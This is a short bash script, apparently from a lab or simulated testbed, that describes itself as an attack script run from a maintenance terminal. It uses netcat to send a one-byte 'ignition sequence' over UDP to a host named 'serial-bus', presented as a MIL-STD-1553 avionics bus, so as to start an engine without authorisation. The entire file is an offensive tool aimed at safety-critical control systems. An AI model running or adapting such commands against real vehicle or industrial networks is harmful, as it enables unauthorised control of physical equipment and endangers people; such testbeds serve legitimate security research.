#!/bin/bash
# Attack script to start the engine
# This script runs ON the Maintenance Terminal
# It targets 'serial-bus' hostname which is only available on the avionics-net

echo "[ATTACK] Sending Ignition Sequence to MIL-STD-1553 Bus..."
echo -e "0x01" | nc -u -w 1 serial-bus 5001
echo "[ATTACK] Ignition Sequence Sent!"
